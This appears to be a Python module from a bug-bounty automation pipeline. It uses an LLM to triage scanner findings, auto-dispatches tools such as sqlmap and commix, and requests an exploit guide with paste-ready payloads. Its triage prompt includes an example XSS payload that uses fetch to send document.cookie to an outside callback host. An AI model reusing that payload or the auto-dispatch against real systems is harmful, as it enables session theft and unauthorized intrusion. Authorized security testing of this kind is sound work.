"""
LLM triage layer. Called ONCE per run after findings.json is assembled.

Sends findings to Claude via the `claude` CLI (Claude Code) and parses the
response into triage.json. No Anthropic API key required — uses the logged-in
Claude Code session.

Design constraints:
- Never called during scanning
- Never called more than once per run
- Findings below confidence_threshold are excluded from LLM input
- Response is structured JSON — no free-form parsing
- Token budget is enforced — large finding sets are summarized before sending
"""

from __future__ import annotations

import json
import logging
import uuid
from datetime import datetime, timezone
from pathlib import Path
from typing import Any

from core.validator import validate_and_write, SchemaValidationError

log = logging.getLogger(__name__)

# Identifier written into triage.json to show CLI was used
_MODEL = "claude-code"

# Maximum findings to send to LLM in a single call
# Beyond this, we summarize/deduplicate before sending
_MAX_FINDINGS_PER_CALL = 150

# Minimum confidence for a finding to be included in LLM triage
_DEFAULT_CONFIDENCE_THRESHOLD = 0.3

# Severity tier ordering used by the post-parse escalation checker
_SEV_ORDER: dict[str, int] = {"info": 0, "low": 1, "medium": 2, "high": 3, "critical": 4}
_SEV_BY_RANK: dict[int, str] = {v: k for k, v in _SEV_ORDER.items()}

_SYSTEM_PROMPT = """You are a senior security researcher performing triage on automated vulnerability scanner findings for a bug bounty program.

Your job is to:
1. Assess each finding for real exploitability — not theoretical risk
2. Eliminate false positives that automated tools commonly produce
3. Prioritize findings by actual impact to the target organization
4. Produce a structured impact statement answering what an attacker does RIGHT NOW

EXECUTION STATUS RULE:
- execution_status: "callback_received" or "screenshot_confirmed" → eligible for "exploitable" verdict
- execution_status: "attempted_no_callback" or "not_attempted" → MUST be "needs_more_info", never "exploitable"
- execution_status absent (recon/infra/info type findings) → assess normally

SEVERITY ESCALATION RULE:
- You may NOT set adjusted_severity more than ONE tier above severity_raw
- Severity tiers in order: info < low < medium < high < critical
- severity_raw "info"     → adjusted_severity ceiling: "low"
- severity_raw "low"      → adjusted_severity ceiling: "medium"
- severity_raw "medium"   → adjusted_severity ceiling: "high"
- severity_raw "high"     → adjusted_severity ceiling: "critical"
- severity_raw "critical" → no ceiling applies
- Exception: if execution_status is "callback_received" or "screenshot_confirmed", ceiling raises by ONE additional tier
- If you believe the true severity warrants a higher rating, set verdict to "needs_more_info" and explain in reasoning exactly what confirmation would establish that severity
- Automated scanners routinely over-rate. Trust execution evidence, not tool severity labels

IMPACT STATEMENT REQUIREMENT:
For every finding you mark "exploitable", the impact field MUST answer ALL THREE of:
1. What specific data or access does an attacker gain?
2. What is the exact delivery method (URL, parameter, header, protocol)?
3. Which CIA component is violated and how?

If you cannot answer all three concretely, set verdict to "needs_more_info".

Do NOT write theoretical impact. Write what the attacker actually does:
  BAD: "An attacker could potentially steal cookies"
  GOOD: "An attacker registers a vendor with venWebUrl=javascript:fetch('https://oast.host/?c='+document.cookie), MPEL admin clicks 'Web Site' link, admin session cookie is exfiltrated to attacker-controlled server, attacker authenticates as MPEL admin"

You must respond with a JSON object in EXACTLY this structure — no markdown, no explanation, just the JSON:
{
  "verdicts": [
    {
      "finding_id": "<uuid>",
      "verdict": "exploitable|not_exploitable|needs_more_info|false_positive",
      "reasoning": "<1-3 sentences explaining your verdict>",
      "adjusted_severity": "critical|high|medium|low|info",
      "impact": "<concrete 2-3 sentence impact: attacker action → data gained → CIA violation>",
      "attack_delivery": "<exact URL/request/parameter used to deliver the exploit>",
      "suggested_next_steps": ["<step 1>", "<step 2>"],
      "burp_worthy": true|false
    }
  ],
  "run_summary": {
    "overall_assessment": "<2-3 sentences about the overall security posture>",
    "top_findings": ["<finding_id_1>", "<finding_id_2>", "<finding_id_3>"],
    "recommended_focus": "<1 sentence on where to spend time next>"
  }
}

Be skeptical. Most automated scanner findings are false positives or informational.
Only mark as "exploitable" if execution has been confirmed (callback_received/screenshot_confirmed)
AND you can write a complete concrete impact statement.
For bug bounty programs, focus on: authentication/authorization issues, injection vulnerabilities,
significant data exposure, and business logic flaws. Deprioritize: missing headers, old software
versions without PoC exploits, informational findings."""


def triage(
    findings_path: Path,
    run_dir: Path,
    confidence_threshold: float = _DEFAULT_CONFIDENCE_THRESHOLD,
) -> Path:
    """
    Run LLM triage on findings.json via the `claude` CLI.

    Args:
        findings_path:        Path to findings.json
        run_dir:              Run output directory (triage.json written here)
        confidence_threshold: Minimum confidence score for inclusion

    Returns:
        Path to triage.json

    Raises:
        FileNotFoundError: If findings_path doesn't exist
        RuntimeError: If the claude CLI is not found or exits non-zero
    """
    if not findings_path.exists():
        raise FileNotFoundError(f"findings.json not found: {findings_path}")

    with open(findings_path) as f:
        findings_doc = json.load(f)

    all_findings = findings_doc.get("findings", [])
    run_id = findings_doc.get("run_id", str(uuid.uuid4()))

    # Filter by confidence threshold
    eligible = [
        f for f in all_findings
        if f.get("confidence", 0) >= confidence_threshold
    ]

    log.info(
        "LLM triage: %d/%d findings meet confidence threshold %.2f",
        len(eligible), len(all_findings), confidence_threshold,
    )

    if not eligible:
        log.info("No findings meet threshold — writing empty triage.json")
        return _write_empty_triage(run_id, run_dir, len(all_findings))

    # Deduplicate: keep highest-confidence finding per (type, lowercased-url)
    # This collapses case variants (/Checkout vs /checkout) and sqlmap multi-payload dupes
    _seen: dict[tuple, dict] = {}
    for f in eligible:
        key = (f.get("type", ""), (f.get("url") or f.get("host") or "").lower())
        existing = _seen.get(key)
        if existing is None or f.get("confidence", 0) > existing.get("confidence", 0):
            _seen[key] = f
    deduped = list(_seen.values())
    if len(deduped) < len(eligible):
        log.info(
            "Deduplicated findings: %d → %d (collapsed same type+url variants)",
            len(eligible), len(deduped),
        )
    eligible = deduped

    # Cap at _MAX_FINDINGS_PER_CALL — prioritise actionable vulns over recon noise
    if len(eligible) > _MAX_FINDINGS_PER_CALL:
        _RECON_TYPES = {"historical_url", "subdomain", "dns_record", "dns_resolution"}
        _SEV_ORDER = {"critical": 0, "high": 1, "medium": 2, "low": 3, "unknown": 4, "info": 5}

        def _triage_sort_key(f):
            sev = _SEV_ORDER.get(f.get("severity_raw", "info"), 5)
            is_recon = 1 if f.get("type", "") in _RECON_TYPES else 0
            conf = -f.get("confidence", 0)
            return (is_recon, sev, conf)

        log.info(
            "Trimming findings from %d to %d for LLM (severity-first, recon last)",
            len(eligible), _MAX_FINDINGS_PER_CALL,
        )
        eligible = sorted(eligible, key=_triage_sort_key)
        eligible = eligible[:_MAX_FINDINGS_PER_CALL]

    # Build LLM prompt
    findings_for_llm = [_strip_finding(f) for f in eligible]
    user_message = (
        f"Program: {findings_doc.get('program_id', 'unknown')}\n"
        f"Playbook: {findings_doc.get('playbook_name', 'unknown')}\n"
        f"Depth: {findings_doc.get('depth', 'unknown')}\n\n"
        f"Findings to triage ({len(findings_for_llm)} total):\n\n"
        f"{json.dumps(findings_for_llm, indent=2)}"
    )

    # Call Claude via CLI
    log.info("Calling claude CLI for triage...")
    combined_prompt = _SYSTEM_PROMPT + "\n\n---\n\n" + user_message
    raw_text = _call_claude_code(combined_prompt)
    log.info("claude CLI response received (%d chars)", len(raw_text))

    prompt_tokens = 0
    completion_tokens = 0
    try:
        llm_output = json.loads(raw_text)
    except json.JSONDecodeError:
        # Try to extract JSON from response if wrapped in markdown
        import re
        json_match = re.search(r"```(?:json)?\s*(\{.*?\})\s*```", raw_text, re.DOTALL)
        if json_match:
            llm_output = json.loads(json_match.group(1))
        else:
            raise ValueError(f"LLM response is not valid JSON:\n{raw_text[:500]}")

    # Post-parse severity escalation check — runs unconditionally before writing
    findings_by_id = {f.get("finding_id", ""): f for f in eligible}
    cleaned_verdicts, escalation_audit = _check_severity_escalation(
        llm_output.get("verdicts", []),
        findings_by_id,
    )
    if escalation_audit:
        log.warning(
            "Severity escalation checker capped %d verdict(s) — see triage_audit.json",
            len(escalation_audit),
        )
        audit_path = run_dir / "triage_audit.json"
        with open(audit_path, "w") as f:
            json.dump({"escalations": escalation_audit}, f, indent=2)

    # Build triage.json
    triage_doc = {
        "schema_version": "1.0",
        "created_at": _now(),
        "run_id": run_id,
        "model": _MODEL,
        "input_findings_count": len(eligible),
        "prompt_tokens": prompt_tokens,
        "completion_tokens": completion_tokens,
        "verdicts": cleaned_verdicts,
        "run_summary": llm_output.get("run_summary", {
            "overall_assessment": "No summary provided.",
            "top_findings": [],
            "recommended_focus": "Review findings manually.",
        }),
    }

    triage_path = run_dir / "triage.json"
    try:
        validate_and_write("triage", triage_doc, triage_path)
    except SchemaValidationError as exc:
        log.error("triage.json validation failed: %s", exc)
        # Write anyway — don't lose the triage
        with open(triage_path, "w") as f:
            json.dump(triage_doc, f, indent=2)

    log.info("triage.json written: %d verdicts", len(triage_doc["verdicts"]))
    return triage_path


def generate_actions(triage_path: Path, run_dir: Path) -> Path:
    """
    Derive actions.json from triage.json. NO LLM call — pure rules logic.

    Rules:
    - exploitable + critical/high → run_tool (follow-up scanner) + burp_scan
    - exploitable + medium → flag_for_human + burp_scan if burp_worthy
    - needs_more_info → flag_for_human
    - false_positive / not_exploitable → skip
    - burp_worthy=True → add burp_task regardless of action type

    Returns:
        Path to actions.json
    """
    if not triage_path.exists():
        raise FileNotFoundError(f"triage.json not found: {triage_path}")

    with open(triage_path) as f:
        triage_doc = json.load(f)

    # Build finding_id → {url, type, depth} lookup from findings.json
    finding_info_map: dict[str, dict] = {}
    findings_path = run_dir / "findings.json"
    if findings_path.exists():
        with open(findings_path) as fh:
            findings_doc = json.load(fh)
        run_depth = findings_doc.get("depth", "standard")
        for f in findings_doc.get("findings", []):
            fid = f.get("finding_id", "")
            url = f.get("url", "") or f.get("host", "")
            if fid and url:
                finding_info_map[fid] = {
                    "url": url,
                    "type": f.get("type", ""),
                    "depth": run_depth,
                }

    run_id = triage_doc.get("run_id", str(uuid.uuid4()))
    actions = []
    burp_tasks = []

    for verdict in triage_doc.get("verdicts", []):
        finding_id = verdict.get("finding_id", str(uuid.uuid4()))
        v = verdict.get("verdict", "skip")
        sev = verdict.get("adjusted_severity", "info")
        burp_worthy = verdict.get("burp_worthy", False)

        action_id = str(uuid.uuid4())
        priority = _severity_to_priority(sev)
        risk = _severity_to_risk(sev)

        if v == "exploitable":
            info = finding_info_map.get(finding_id, {})
            tool_name = _vuln_type_to_tool(info.get("type", ""))
            if tool_name:
                actions.append({
                    "action_id": action_id,
                    "finding_id": finding_id,
                    "action_type": "run_tool",
                    "tool": tool_name,
                    "parameters": {
                        "target": _host_from_url(info["url"]),
                        "url": info["url"],
                        "depth": info.get("depth", "standard"),
                    },
                    "priority": priority,
                    "risk_level": risk,
                    "reason": f"Exploitable {sev} {info.get('type', '')} — auto-dispatch to {tool_name}",
                    "status": "pending",
                })
            else:
                actions.append({
                    "action_id": action_id,
                    "finding_id": finding_id,
                    "action_type": "flag_for_human",
                    "priority": priority,
                    "risk_level": risk,
                    "reason": f"Exploitable {sev} — no auto-dispatch for type '{info.get('type', 'unknown')}'",
                    "status": "pending",
                })

        elif v == "needs_more_info":
            actions.append({
                "action_id": action_id,
                "finding_id": finding_id,
                "action_type": "flag_for_human",
                "priority": min(priority + 1, 5),
                "risk_level": "low",
                "reason": "Needs manual investigation to confirm",
                "status": "pending",
            })

        else:  # false_positive or not_exploitable
            actions.append({
                "action_id": action_id,
                "finding_id": finding_id,
                "action_type": "skip",
                "priority": 5,
                "risk_level": "low",
                "reason": v,
                "status": "pending",
            })

        # Burp task if burp_worthy
        if burp_worthy and v in ("exploitable", "needs_more_info"):
            burp_tasks.append({
                "task_id": str(uuid.uuid4()),
                "finding_id": finding_id,
                "target_url": finding_info_map.get(finding_id, {}).get("url", ""),
                "scan_type": "crawl_and_audit" if sev in ("critical", "high") else "audit_only",
                "config_profile": "default",
                "status": "pending",
            })

    # Filter burp_tasks that have empty target_url — can't submit to Burp without a URL
    burp_tasks = [t for t in burp_tasks if t.get("target_url")]

    actions_doc = {
        "schema_version": "1.0",
        "created_at": _now(),
        "run_id": run_id,
        "actions": actions,
        "burp_tasks": burp_tasks,
    }

    actions_path = run_dir / "actions.json"
    try:
        from core.validator import validate_and_write, SchemaValidationError
        validate_and_write("actions", actions_doc, actions_path)
    except SchemaValidationError as exc:
        log.error("actions.json validation failed: %s", exc)
        with open(actions_path, "w") as f:
            json.dump(actions_doc, f, indent=2)

    log.info(
        "actions.json written: %d actions, %d burp tasks",
        len(actions), len(burp_tasks),
    )
    return actions_path


# ---------------------------------------------------------------------------
# Internal helpers
# ---------------------------------------------------------------------------

def _call_claude_code(prompt: str) -> str:
    """
    Legacy Claude-tier call, now routed through the unified router (core.models),
    role "orchestrator" (claude-fable-5 by default). The bus agents supersede
    these legacy triage()/generate_exploit_guide() paths, but they stay working.
    """
    from core.models import complete
    return complete("orchestrator", [{"role": "user", "content": prompt}], timeout=300).text


def _strip_finding(f: dict) -> dict:
    """Remove large/noisy fields before sending to LLM."""
    return {
        "finding_id": f.get("finding_id"),
        "type": f.get("type"),
        "severity_raw": f.get("severity_raw"),
        "url": f.get("url"),
        "host": f.get("host"),
        "evidence": f.get("evidence"),
        "tool": f.get("tool"),
        "confidence": f.get("confidence"),
        # Include a short excerpt of raw output — not the whole thing
        "raw_excerpt": str(f.get("raw_output", ""))[:300],
    }


def _severity_to_priority(sev: str) -> int:
    return {"critical": 1, "high": 2, "medium": 3, "low": 4, "info": 5}.get(sev, 5)


def _severity_to_risk(sev: str) -> str:
    return {"critical": "high", "high": "high", "medium": "medium"}.get(sev, "low")


def _write_empty_triage(run_id: str, run_dir: Path, total_findings: int) -> Path:
    doc = {
        "schema_version": "1.0",
        "created_at": _now(),
        "run_id": run_id,
        "model": _MODEL,
        "input_findings_count": 0,
        "prompt_tokens": 0,
        "completion_tokens": 0,
        "verdicts": [],
        "run_summary": {
            "overall_assessment": (
                f"No findings met the confidence threshold. "
                f"{total_findings} total findings were below threshold."
            ),
            "top_findings": [],
            "recommended_focus": "Run with a lower confidence threshold or exhaustive depth.",
        },
    }
    triage_path = run_dir / "triage.json"
    with open(triage_path, "w") as f:
        json.dump(doc, f, indent=2)
    return triage_path


def _now() -> str:
    return datetime.now(timezone.utc).isoformat()


# ---------------------------------------------------------------------------
# Severity escalation checker
# ---------------------------------------------------------------------------

def _check_severity_escalation(
    verdicts: list[dict],
    findings_by_id: dict[str, dict],
) -> tuple[list[dict], list[dict]]:
    """
    Cap adjusted_severity to at most one tier above severity_raw.
    Confirmed execution (callback_received / screenshot_confirmed) allows two tiers.

    Returns (cleaned_verdicts, audit_entries).
    audit_entries is non-empty only when at least one verdict was capped.
    """
    cleaned: list[dict] = []
    audit: list[dict] = []

    for v in verdicts:
        fid = v.get("finding_id", "")
        original = findings_by_id.get(fid, {})
        raw_sev = original.get("severity_raw", "info")
        adj_sev = v.get("adjusted_severity", "info")
        exec_status = original.get("execution_status", "")
        confirmed = exec_status in ("callback_received", "screenshot_confirmed")

        raw_rank = _SEV_ORDER.get(raw_sev, 0)
        adj_rank = _SEV_ORDER.get(adj_sev, 0)
        allowed_jump = 2 if confirmed else 1
        max_rank = min(raw_rank + allowed_jump, 4)

        if adj_rank > max_rank:
            capped_sev = _SEV_BY_RANK[max_rank]
            audit.append({
                "finding_id": fid,
                "severity_raw": raw_sev,
                "llm_claimed": adj_sev,
                "capped_to": capped_sev,
                "confirmed_execution": confirmed,
            })
            cleaned.append({**v, "adjusted_severity": capped_sev, "severity_escalated": True})
        else:
            cleaned.append({**v, "severity_escalated": adj_rank > raw_rank})

    return cleaned, audit


# ---------------------------------------------------------------------------
# Vuln-type → tool dispatch map
# ---------------------------------------------------------------------------

_VULN_TOOL_MAP: dict[str, str] = {
    "sqli": "sqlmap",
    "xss": "dalfox",
    "command_injection": "commix",
    "ssrf": "ffuf",
    "path_traversal": "ffuf",
    "open_redirect": "ffuf",
    "secret_exposure": "trufflehog",
    "misconfiguration": "nuclei",
    # ZAP handles broad active scanning for auth/logic/injection when no
    # specialised tool maps to the finding type
    "auth_bypass": "zap",
    "idor": "zap",
    "csrf": "zap",
    "jwt_weakness": "zap",
    "cve": "nuclei",
    "lfi": "ffuf",
    "ssti": "ffuf",
}


def _vuln_type_to_tool(vuln_type: str) -> str | None:
    """Return the tool name for a given vulnerability type, or None if no auto-dispatch."""
    return _VULN_TOOL_MAP.get(vuln_type)


def _host_from_url(url: str) -> str:
    """Extract hostname from a URL, falling back to the raw string."""
    from urllib.parse import urlparse
    try:
        return urlparse(url).hostname or url
    except Exception:
        return url


# ---------------------------------------------------------------------------
# Exploit guide (second LLM call)
# ---------------------------------------------------------------------------

_EXPLOIT_GUIDE_PROMPT = """You are an expert penetration tester and bug bounty hunter.

You will be given:
1. A list of exploitable/suspicious findings from automated scanners
2. LLM triage verdicts for each finding

Your job is to produce a MANUAL TESTING GUIDE in Markdown with three sections:

## Chain Analysis
Identify which findings can be combined for greater impact. Think about:
- XSS + CSRF → one-click account takeover
- Open redirect + OAuth → authorization code / token hijack
- SSRF → probing internal endpoints → potential RCE
- IDOR + sensitive object → data exfiltration
- Auth bypass + any other → privilege escalation
For each chain: explain the attack path, estimated impact, and prerequisites.

## Per-Finding Payloads
For each finding, provide:
- The exact, crafted payload string ready to paste (not a generic example — use the actual URL/parameter/context from the finding)
- One-sentence explanation of what it tests

## Burp Step-by-Step Instructions
For each finding (and each chain), write numbered steps:
1. Which Burp tool to use (Proxy intercept / Repeater / Intruder / Decoder)
2. Exactly which request to intercept or craft
3. Exactly what to change and where (parameter name, header, body field)
4. What response indicator confirms success (status code, response body string, redirect location, out-of-band callback, etc.)

Be specific. Use the actual URLs and parameters from the findings. Do not write generic advice."""


def generate_exploit_guide(
    triage_path: Path,
    findings_path: Path,
    run_dir: Path,
) -> Path:
    """
    Second LLM call: reason about exploit chains and produce a manual testing
    guide with crafted payloads and Burp step-by-step instructions.

    Returns:
        Path to exploit_guide.md
    """
    if not triage_path.exists():
        raise FileNotFoundError(f"triage.json not found: {triage_path}")

    with open(triage_path) as f:
        triage_doc = json.load(f)

    # Only include exploitable and needs_more_info verdicts
    relevant_verdicts = [
        v for v in triage_doc.get("verdicts", [])
        if v.get("verdict") in ("exploitable", "needs_more_info")
    ]

    guide_path = run_dir / "exploit_guide.md"

    if not relevant_verdicts:
        log.info("No exploitable findings — skipping exploit guide")
        guide_path.write_text("# Exploit Guide\n\nNo exploitable findings to guide.\n")
        return guide_path

    # Enrich verdicts with full finding details
    finding_detail: dict[str, dict] = {}
    findings_doc: dict = {}
    if findings_path.exists():
        with open(findings_path) as fh:
            findings_doc = json.load(fh)
        for f in findings_doc.get("findings", []):
            fid = f.get("finding_id", "")
            if fid:
                finding_detail[fid] = _strip_finding(f)

    enriched = []
    for v in relevant_verdicts:
        fid = v.get("finding_id", "")
        entry = dict(v)
        if fid in finding_detail:
            entry["finding_detail"] = finding_detail[fid]
        enriched.append(entry)

    user_message = (
        f"Program: {findings_doc.get('program_id', 'unknown')}\n\n"
        f"Findings + triage verdicts ({len(enriched)} total):\n\n"
        f"{json.dumps(enriched, indent=2)}"
    )

    combined_prompt = _EXPLOIT_GUIDE_PROMPT + "\n\n---\n\n" + user_message
    log.info("Calling claude CLI for exploit guide (%d findings)...", len(enriched))
    guide_text = _call_claude_code(combined_prompt)

    guide_path.write_text(guide_text)
    log.info("exploit_guide.md written: %s", guide_path)
    return guide_path
